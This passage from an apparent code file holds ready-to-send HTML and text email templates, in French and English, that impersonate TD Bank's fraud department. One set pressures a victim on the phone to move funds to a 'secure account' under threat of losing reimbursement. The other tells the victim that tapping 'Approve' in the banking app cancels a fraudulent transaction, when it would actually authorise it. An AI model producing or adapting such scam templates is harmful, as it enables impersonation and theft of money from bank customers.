            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;background:#fff8f0;border:1px solid #f5c6a0;border-left:4px solid #c0392b;border-radius:0 8px 8px 0;"><tr><td style="padding:16px 20px;"><p class="body-text" style="margin:0 0 8px;color:#c0392b;font-size:12px;font-weight:700;letter-spacing:0.7px;text-transform:uppercase;">&#9888; Point d&apos;attention critique</p><p class="body-text" style="margin:0;color:#7a3000;font-size:14px;line-height:1.8;">Nous insistons sur l&apos;urgence et le caract&egrave;re imp&eacute;ratif de ces mesures. Toute action effectu&eacute;e <strong>sans la validation de votre conseiller</strong> pourrait exposer vos fonds &agrave; un risque de <strong>perte d&eacute;finitive.</strong></p></td></tr></table>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;background:#f0faf3;border:1.5px solid #1a7b3a;border-radius:8px;"><tr><td style="padding:18px 20px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="36" valign="top" style="padding-right:14px;padding-top:2px;"><div style="width:36px;height:36px;background:#1a7b3a;border-radius:50%;text-align:center;line-height:36px;font-size:18px;">&#128222;</div></td><td><p style="margin:0 0 6px;color:#1a5c2a;font-size:12px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">Restez en ligne avec votre conseiller</p><p class="body-text" style="margin:0;color:#1a3020;font-size:14px;line-height:1.8;">Restez en ligne avec votre conseiller jusqu&apos;&agrave; la <strong>confirmation finale de s&eacute;curisation</strong> de vos avoirs. <strong>Ne raccrochez pas</strong> tant qu&apos;il ne vous aura pas inform&eacute; que toutes vos sommes sont d&eacute;finitivement prot&eacute;g&eacute;es.</p></td></tr></table></td></tr></table>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:24px;"><tr><td style="height:1px;background:#e8eeed;"></td></tr></table>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:16px;"><tr><td style="background:#f5f5f5;border-radius:6px;padding:10px 18px;border-left:4px solid #555555;"><p style="margin:0;color:#333333;font-size:13px;font-weight:700;letter-spacing:0.3px;">&#128220;&nbsp; Point essentiel &mdash; Conditions de la protection anti-fraude</p></td></tr></table>
            <p class="body-text" style="margin:0 0 16px;color:#333333;font-size:14px;line-height:1.8;">Conform&eacute;ment &agrave; nos conditions g&eacute;n&eacute;rales et &agrave; la r&eacute;glementation en vigueur, la protection anti-fraude dont vous b&eacute;n&eacute;ficiez est conditionn&eacute;e au <strong>respect strict des instructions de s&eacute;curit&eacute;</strong> qui vous sont communiqu&eacute;es par notre service.</p>
            <p class="body-text" style="margin:0 0 12px;color:#333333;font-size:14px;line-height:1.8;font-weight:600;">En cons&eacute;quence, dans les cas suivants&nbsp;:</p>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:16px;background:#f9f9f9;border-radius:8px;border:1px solid #e0e0e0;"><tr><td style="padding:16px 20px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="16" valign="top" style="padding-right:10px;padding-top:3px;color:#c0392b;font-size:16px;font-weight:700;">&#183;</td><td><p style="margin:0 0 10px;color:#444444;font-size:14px;line-height:1.7;">Si vous ne suivez pas scrupuleusement les instructions de votre conseiller concernant le transfert de vos fonds vers le compte s&eacute;curis&eacute;&nbsp;;</p></td></tr><tr><td width="16" valign="top" style="padding-right:10px;padding-top:3px;color:#c0392b;font-size:16px;font-weight:700;">&#183;</td><td><p style="margin:0 0 10px;color:#444444;font-size:14px;line-height:1.7;">Si vous effectuez une op&eacute;ration non valid&eacute;e par lui&nbsp;;</p></td></tr><tr><td width="16" valign="top" style="padding-right:10px;padding-top:3px;color:#c0392b;font-size:16px;font-weight:700;">&#183;</td><td><p style="margin:0;color:#444444;font-size:14px;line-height:1.7;">Si vous interrompez la proc&eacute;dure avant son terme&nbsp;;</p></td></tr></table></td></tr></table>
            <p class="body-text" style="margin:0 0 12px;color:#444444;font-size:14px;line-height:1.7;font-style:italic;">et que vos fonds viennent &agrave; &ecirc;tre fraud&eacute;s ou d&eacute;tourn&eacute;s&nbsp;:</p>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:24px;background:#fff5f5;border:1px solid #f5c6c6;border-radius:8px;"><tr><td style="padding:16px 20px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:3px;"><span style="color:#c0392b;font-size:14px;">&#10006;</span></td><td><p style="margin:0 0 10px;color:#5a0000;font-size:14px;line-height:1.7;">Vous serez tenu pour <strong>seul responsable</strong> des pertes subies&nbsp;;</p></td></tr><tr><td width="20" valign="top" style="padding-right:10px;padding-top:3px;"><span style="color:#c0392b;font-size:14px;">&#10006;</span></td><td><p style="margin:0 0 10px;color:#5a0000;font-size:14px;line-height:1.7;">Vous ne pourrez pr&eacute;tendre &agrave; <strong>aucun remboursement</strong> au titre de la protection anti-fraude&nbsp;;</p></td></tr><tr><td width="20" valign="top" style="padding-right:10px;padding-top:3px;"><span style="color:#c0392b;font-size:14px;">&#10006;</span></td><td><p style="margin:0;color:#5a0000;font-size:14px;line-height:1.7;">La banque <strong>d&eacute;cline toute responsabilit&eacute;</strong> et ne pourra &ecirc;tre tenue responsable des sommes perdues.</p></td></tr></table></td></tr></table>
            <p class="body-text" style="margin:0 0 24px;color:#444444;font-size:14px;line-height:1.8;">Nous vous rappelons que la protection <strong>&laquo;&nbsp;z&eacute;ro responsabilit&eacute;&nbsp;&raquo;</strong> ne s&apos;applique qu&apos;aux op&eacute;rations que vous n&apos;avez pas valid&eacute;es ou autoris&eacute;es. D&egrave;s lors que vous avez re&ccedil;u les instructions claires de notre service et que vous choisissez de ne pas les ex&eacute;cuter, vous engagez votre pleine et enti&egrave;re responsabilit&eacute;.</p>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:24px;"><tr><td style="height:1px;background:#e8eeed;"></td></tr></table>
            <p class="body-text" style="margin:0 0 14px;color:#1a1a1a;font-size:14px;line-height:1.8;font-weight:700;">Nous vous recommandons donc vivement de&nbsp;:</p>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;background:#e8f5ec;border-radius:8px;border:1px solid #c3dfc8;"><tr><td style="padding:16px 20px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:3px;"><span style="color:#1a7b3a;font-size:14px;font-weight:700;">&#10003;</span></td><td><p style="margin:0 0 10px;color:#1a3020;font-size:14px;line-height:1.7;">Rester en ligne avec votre conseiller jusqu&apos;&agrave; la fin de la proc&eacute;dure&nbsp;;</p></td></tr><tr><td width="20" valign="top" style="padding-right:10px;padding-top:3px;"><span style="color:#1a7b3a;font-size:14px;font-weight:700;">&#10003;</span></td><td><p style="margin:0 0 10px;color:#1a3020;font-size:14px;line-height:1.7;">Suivre l&apos;int&eacute;gralit&eacute; des &eacute;tapes qu&apos;il vous indiquera&nbsp;;</p></td></tr><tr><td width="20" valign="top" style="padding-right:10px;padding-top:3px;"><span style="color:#1a7b3a;font-size:14px;font-weight:700;">&#10003;</span></td><td><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.7;">Ne r&eacute;aliser aucune op&eacute;ration sans son accord pr&eacute;alable.</p></td></tr></table></td></tr></table>
            <p class="body-text" style="margin:0 0 24px;color:#333333;font-size:14px;line-height:1.8;font-style:italic;">La s&eacute;curisation de vos avoirs d&eacute;pend de votre r&eacute;activit&eacute; et de votre stricte conformit&eacute; aux instructions qui vous sont donn&eacute;es.</p>
            <p class="body-text" style="margin:0 0 28px;color:#333333;font-size:14px;line-height:1.8;">Nous vous remercions pour votre collaboration et restons &agrave; votre disposition.</p>
            <p style="margin:0 0 4px;color:#1a1a1a;font-size:14px;font-weight:700;">Cordialement,</p>
            <p style="margin:0 0 2px;color:#333333;font-size:14px;">Le Service de Lutte contre la Fraude</p>
            <p style="margin:0;color:#1a7b3a;font-size:14px;font-weight:700;">TD Banque</p>
          </td>
        </tr>
        <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Rappel de s&eacute;curit&eacute;&nbsp;:</strong> La Banque TD ne vous demandera jamais votre mot de passe, NIP ou num&eacute;ro de carte complet par courriel ou par t&eacute;l&eacute;phone. Si vous avez un doute, contactez-nous au <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">Banque TD</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Confidentialit&eacute;</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Conditions d&apos;utilisation</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Nous contacter</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">Ce courriel a &eacute;t&eacute; envoy&eacute; automatiquement par le syst&egrave;me de s&eacute;curit&eacute; de TD Banque. Merci de ne pas r&eacute;pondre directement &agrave; ce message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2026 TD Banque. Tous droits r&eacute;serv&eacute;s. La Banque Toronto-Dominion.</p></td></tr></table></td></tr>
        <tr><td style="height:32px;background:#f2f4f6;"></td></tr>
      </table>
    </td></tr>
  </table>
</body>
</html>`,
        text: `Madame, Monsieur,\n\nNotre système de détection a identifié des tentatives de fraude sur votre compte bancaire. Votre conseiller en prévention de la fraude est actuellement en ligne avec vous et va vous accompagner pas à pas dans la procédure de sécurisation de l'intégralité de vos avoirs.\n\nVeuillez suivre scrupuleusement toutes les instructions données par votre conseiller. Ne réalisez aucune opération sans son accord préalable.\n\nCordialement,\nLe Service de Lutte contre la Fraude\nTD Banque\n© 2026 TD Banque. Tous droits réservés.`,
      },
    }, // end fraud

    approval: {
      en: {
        subject: 'Security Alert – TD Bank',
        html: `<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="x-apple-disable-message-reformatting">
  <meta name="format-detection" content="telephone=no, date=no, address=no, email=no, url=no">
  <title>Security Alert &#8211; TD Bank</title>
  <meta name="description" content="Your attention is required regarding a suspicious transaction on your TD Bank account.">
  <!--[if mso]>
  <noscript><xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml></noscript>
  <![endif]-->
  <style type="text/css">
    * { box-sizing: border-box; }
    body, html { margin: 0 !important; padding: 0 !important; width: 100% !important; min-width: 100%; background-color: #f2f4f6; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
    table { border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; }
    img { border: 0; outline: none; text-decoration: none; -ms-interpolation-mode: bicubic; max-width: 100%; display: block; }
    a { text-decoration: none; color: #1a7b3a; }
    @media only screen and (max-width: 620px) {
      .email-wrapper { width: 100% !important; }
      .email-body { padding: 24px 20px !important; }
      .header-logo { font-size: 22px !important; }
      .main-title { font-size: 20px !important; }
      .body-text { font-size: 14px !important; }
      .alert-amount { font-size: 26px !important; }
      .footer-text { font-size: 11px !important; }
      .cta-box { padding: 20px !important; }
    }
  </style>
</head>
<body style="margin:0;padding:0;background-color:#f2f4f6;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
  <div style="display:none;max-height:0;overflow:hidden;font-size:1px;color:#f2f4f6;line-height:1px;mso-hide:all;">&#9888;&#65039; Action required &mdash; Suspicious transaction detected on your TD account &zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;</div>
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color:#f2f4f6;">
    <tr><td align="center" style="padding:32px 16px 40px;">
      <table role="presentation" class="email-wrapper" width="600" cellspacing="0" cellpadding="0" border="0" style="max-width:600px;width:100%;">
        <tr>
          <td style="background:#1a5c2a;padding:0 32px;border-radius:10px 10px 0 0;">
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
              <tr>
                <td style="padding:20px 0 18px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:#ffffff;border-radius:6px;padding:6px 14px;"><span class="header-logo" style="font-size:24px;font-weight:900;color:#1a7b3a;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:14px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.75);font-size:12px;font-weight:500;letter-spacing:0.5px;text-transform:uppercase;">TD Bank &mdash; Security Service</p></td></tr></table></td>
                <td align="right" style="padding:20px 0 18px;"><p style="margin:0;color:rgba(255,255,255,0.5);font-size:11px;">Secure message &#128274;</p></td>
              </tr>
            </table>
          </td>
        </tr>
        <tr>
          <td style="background:#c0392b;padding:14px 32px;">
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="28" valign="middle" style="padding-right:10px;"><div style="width:24px;height:24px;text-align:center;line-height:24px;font-size:16px;">&#9888;&#65039;</div></td><td valign="middle"><p style="margin:0;color:#ffffff;font-size:13px;font-weight:700;letter-spacing:0.3px;">SECURITY ALERT &mdash; SUSPICIOUS TRANSACTION DETECTED</p></td></tr></table>
          </td>
        </tr>
        <tr>
          <td class="email-body" style="background:#ffffff;padding:40px 36px 32px;border-left:1px solid #e0e4e0;border-right:1px solid #e0e4e0;">
            <p class="body-text" style="margin:0 0 24px;color:#1a1a1a;font-size:15px;line-height:1.7;font-weight:600;">Dear Customer,</p>
            <p class="body-text" style="margin:0 0 20px;color:#333333;font-size:15px;line-height:1.8;">Our monitoring system has detected a recent transaction on your account that you have reported as unauthorized.</p>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:24px;"><tr><td style="height:1px;background:linear-gradient(90deg,transparent,#d4edda,transparent);"></td></tr></table>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border-left:4px solid #1a7b3a;background:#f0faf3;border-radius:0 8px 8px 0;"><tr><td style="padding:16px 20px;"><p style="margin:0 0 6px;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">Immediate Protection Measure</p><p class="body-text" style="margin:0;color:#1a3020;font-size:14px;line-height:1.7;">In accordance with our fraud prevention procedure, we have <strong>immediately blocked</strong> this transaction. However, to proceed with its final cancellation, your formal validation is required.</p></td></tr></table>
            <p class="body-text" style="margin:0 0 28px;color:#333333;font-size:15px;line-height:1.8;">You will receive a <strong>notification</strong> on your mobile application. Simply tap <strong style="color:#1a7b3a;">&laquo;&nbsp;Approve&nbsp;&raquo;</strong> to confirm that this transaction is fraudulent and authorize its cancellation.</p>
            <table role="presentation" class="cta-box" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;background:#f8fffe;border:1.5px solid #1a7b3a;border-radius:10px;padding:0;"><tr><td style="padding:24px 28px;"><p style="margin:0 0 8px;color:#1a5c2a;font-size:12px;font-weight:700;letter-spacing:0.7px;text-transform:uppercase;">Action required on your phone</p><p class="body-text" style="margin:0 0 16px;color:#1a3020;font-size:14px;line-height:1.7;">Please open your TD app and tap the button:</p><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td style="background:#1a7b3a;border-radius:6px;padding:11px 28px;text-align:center;"><span style="color:#ffffff;font-size:15px;font-weight:700;letter-spacing:0.3px;">&#10003;&nbsp; Approve</span></td></tr></table></td></tr></table>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;background:#fff8f0;border:1px solid #f5c6a0;border-radius:8px;"><tr><td style="padding:14px 18px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="22" valign="top" style="padding-right:10px;padding-top:2px;"><span style="color:#c0392b;font-size:15px;">&#9888;</span></td><td><p class="body-text" style="margin:0;color:#7a3000;font-size:13px;line-height:1.7;">Please note that this transaction will only be cancelled <strong>after your validation</strong>. Until you tap <strong>&laquo;&nbsp;Approve&nbsp;&raquo;</strong>, the funds will remain suspended and the transaction could be automatically processed.</p></td></tr></table></td></tr></table>
            <p class="body-text" style="margin:0 0 28px;color:#333333;font-size:15px;line-height:1.8;">We remind you that in the event of confirmed fraud, you benefit from <strong>full protection</strong> and will be fully reimbursed, provided you validate promptly.</p>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;"><tr><td style="height:1px;background:#e8eeed;"></td></tr></table>
            <p class="body-text" style="margin:0 0 8px;color:#1a1a1a;font-size:15px;line-height:1.8;font-weight:600;">Please check your phone without delay and tap <strong style="color:#1a7b3a;">&laquo;&nbsp;Approve&nbsp;&raquo;</strong> to finalize the cancellation and secure your account.</p>
            <p class="body-text" style="margin:0 0 32px;color:#555555;font-size:14px;line-height:1.8;">We thank you for your prompt cooperation and remain at your disposal for any questions.</p>
            <p style="margin:0 0 4px;color:#1a1a1a;font-size:14px;font-weight:700;">Sincerely,</p>
            <p style="margin:0 0 2px;color:#333333;font-size:14px;">The Security and Fraud Prevention Service</p>
            <p style="margin:0;color:#1a7b3a;font-size:14px;font-weight:700;">TD Bank</p>
          </td>
        </tr>
        <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Security reminder:</strong> TD Bank will never ask for your password, PIN or full card number by email or phone. If in doubt, contact us at <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">TD Bank</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Privacy</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Terms of Use</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Contact Us</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">This email was sent automatically by TD Bank's security system. Please do not reply directly to this message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2026 TD Bank. All rights reserved. The Toronto-Dominion Bank.</p></td></tr></table></td></tr>
        <tr><td style="height:32px;background:#f2f4f6;"></td></tr>
      </table>
    </td></tr>
  </table>
</body>
</html>`,
        text: `Dear Customer,\n\nOur monitoring system has detected a recent transaction on your account that you have reported as unauthorized.\n\nWe have immediately blocked this transaction. To finalize its cancellation, please open your TD app and tap "Approve".\n\nSincerely,\nThe Security and Fraud Prevention Service\nTD Bank\n© 2026 TD Bank. All rights reserved.`,
      },
      fr: {
        subject: 'Alerte de sécurité – TD Banque',
        html: `<!DOCTYPE html>
<html lang="fr" xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="x-apple-disable-message-reformatting">
  <meta name="format-detection" content="telephone=no, date=no, address=no, email=no, url=no">
  <title>Alerte de s&eacute;curit&eacute; &#8211; TD Bank</title>
  <meta name="description" content="Votre attention est requise concernant une op&eacute;ration suspecte sur votre compte TD Bank.">
  <!--[if mso]>
  <noscript><xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml></noscript>
  <![endif]-->
  <style type="text/css">
    * { box-sizing: border-box; }
    body, html { margin: 0 !important; padding: 0 !important; width: 100% !important; min-width: 100%; background-color: #f2f4f6; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
    table { border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; }
    img { border: 0; outline: none; text-decoration: none; -ms-interpolation-mode: bicubic; max-width: 100%; display: block; }
    a { text-decoration: none; color: #1a7b3a; }
    @media only screen and (max-width: 620px) {
      .email-wrapper { width: 100% !important; }
      .email-body { padding: 24px 20px !important; }
      .header-logo { font-size: 22px !important; }
      .main-title { font-size: 20px !important; }
      .body-text { font-size: 14px !important; }
      .alert-amount { font-size: 26px !important; }
      .footer-text { font-size: 11px !important; }
      .cta-box { padding: 20px !important; }
    }
  </style>
</head>
<body style="margin:0;padding:0;background-color:#f2f4f6;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
  <div style="display:none;max-height:0;overflow:hidden;font-size:1px;color:#f2f4f6;line-height:1px;mso-hide:all;">&#9888;&#65039; Action requise &mdash; Transaction suspecte d&eacute;tect&eacute;e sur votre compte TD &zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;</div>
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color:#f2f4f6;">
    <tr><td align="center" style="padding:32px 16px 40px;">
      <table role="presentation" class="email-wrapper" width="600" cellspacing="0" cellpadding="0" border="0" style="max-width:600px;width:100%;">
        <tr>
          <td style="background:#1a5c2a;padding:0 32px;border-radius:10px 10px 0 0;">
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
              <tr>
                <td style="padding:20px 0 18px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:#ffffff;border-radius:6px;padding:6px 14px;"><span class="header-logo" style="font-size:24px;font-weight:900;color:#1a7b3a;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:14px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.75);font-size:12px;font-weight:500;letter-spacing:0.5px;text-transform:uppercase;">Banque TD &mdash; Service S&eacute;curit&eacute;</p></td></tr></table></td>
                <td align="right" style="padding:20px 0 18px;"><p style="margin:0;color:rgba(255,255,255,0.5);font-size:11px;">Message s&eacute;curis&eacute; &#128274;</p></td>
              </tr>
            </table>
          </td>
        </tr>
        <tr><td style="background:#c0392b;padding:14px 32px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="28" valign="middle" style="padding-right:10px;"><div style="width:24px;height:24px;text-align:center;line-height:24px;font-size:16px;">&#9888;&#65039;</div></td><td valign="middle"><p style="margin:0;color:#ffffff;font-size:13px;font-weight:700;letter-spacing:0.3px;">ALERTE S&Eacute;CURIT&Eacute; &mdash; TRANSACTION SUSPECTE D&Eacute;TECT&Eacute;E</p></td></tr></table></td></tr>
        <tr>
          <td class="email-body" style="background:#ffffff;padding:40px 36px 32px;border-left:1px solid #e0e4e0;border-right:1px solid #e0e4e0;">
            <p class="body-text" style="margin:0 0 24px;color:#1a1a1a;font-size:15px;line-height:1.7;font-weight:600;">Madame, Monsieur,</p>
            <p class="body-text" style="margin:0 0 20px;color:#333333;font-size:15px;line-height:1.8;">Notre syst&egrave;me de surveillance a d&eacute;tect&eacute; une op&eacute;ration r&eacute;cente sur votre compte que vous nous d&eacute;clarez ne pas avoir effectu&eacute;e.</p>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:24px;"><tr><td style="height:1px;background:linear-gradient(90deg,transparent,#d4edda,transparent);"></td></tr></table>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border-left:4px solid #1a7b3a;background:#f0faf3;border-radius:0 8px 8px 0;"><tr><td style="padding:16px 20px;"><p style="margin:0 0 6px;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">Mesure de protection imm&eacute;diate</p><p class="body-text" style="margin:0;color:#1a3020;font-size:14px;line-height:1.7;">Conform&eacute;ment &agrave; notre proc&eacute;dure de lutte contre la fraude, nous avons <strong>imm&eacute;diatement bloqu&eacute;</strong> cette transaction. Toutefois, pour proc&eacute;der &agrave; son annulation d&eacute;finitive, votre validation formelle est n&eacute;cessaire.</p></td></tr></table>
            <p class="body-text" style="margin:0 0 28px;color:#333333;font-size:15px;line-height:1.8;">Vous allez recevoir une <strong>notification</strong> sur votre application mobile. Il vous suffira de cliquer sur <strong style="color:#1a7b3a;">&#171;&nbsp;Approuver&nbsp;&#187;</strong> pour confirmer que cette op&eacute;ration est bien frauduleuse et autoriser son annulation.</p>
            <table role="presentation" class="cta-box" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;background:#f8fffe;border:1.5px solid #1a7b3a;border-radius:10px;padding:0;"><tr><td style="padding:24px 28px;"><p style="margin:0 0 8px;color:#1a5c2a;font-size:12px;font-weight:700;letter-spacing:0.7px;text-transform:uppercase;">Action requise sur votre t&eacute;l&eacute;phone</p><p class="body-text" style="margin:0 0 16px;color:#1a3020;font-size:14px;line-height:1.7;">Veuillez consulter votre application TD et appuyer sur le bouton&nbsp;:</p><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td style="background:#1a7b3a;border-radius:6px;padding:11px 28px;text-align:center;"><span style="color:#ffffff;font-size:15px;font-weight:700;letter-spacing:0.3px;">&#10003;&nbsp; Approuver</span></td></tr></table></td></tr></table>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;background:#fff8f0;border:1px solid #f5c6a0;border-radius:8px;"><tr><td style="padding:14px 18px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="22" valign="top" style="padding-right:10px;padding-top:2px;"><span style="color:#c0392b;font-size:15px;">&#9888;</span></td><td><p class="body-text" style="margin:0;color:#7a3000;font-size:13px;line-height:1.7;">Nous attirons votre attention sur le fait que cette transaction ne sera annul&eacute;e <strong>qu&apos;apr&egrave;s votre validation</strong>. Tant que vous n&apos;aurez pas appuy&eacute; sur <strong>&#171;&nbsp;Approuver&nbsp;&#187;</strong>, les fonds resteront suspendus et l&apos;op&eacute;ration pourrait &ecirc;tre automatiquement valid&eacute;e.</p></td></tr></table></td></tr></table>
            <p class="body-text" style="margin:0 0 28px;color:#333333;font-size:15px;line-height:1.8;">Nous vous rappelons qu&apos;en cas de fraude av&eacute;r&eacute;e, vous b&eacute;n&eacute;ficiez d&apos;une <strong>protection totale</strong> et serez rembours&eacute; int&eacute;gralement, &agrave; condition de valider rapidement.</p>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;"><tr><td style="height:1px;background:#e8eeed;"></td></tr></table>
            <p class="body-text" style="margin:0 0 8px;color:#1a1a1a;font-size:15px;line-height:1.8;font-weight:600;">Nous vous prions de consulter votre t&eacute;l&eacute;phone sans d&eacute;lai et d&apos;appuyer sur <strong style="color:#1a7b3a;">&#171;&nbsp;Approuver&nbsp;&#187;</strong> afin de finaliser l&apos;annulation et s&eacute;curiser votre compte.</p>
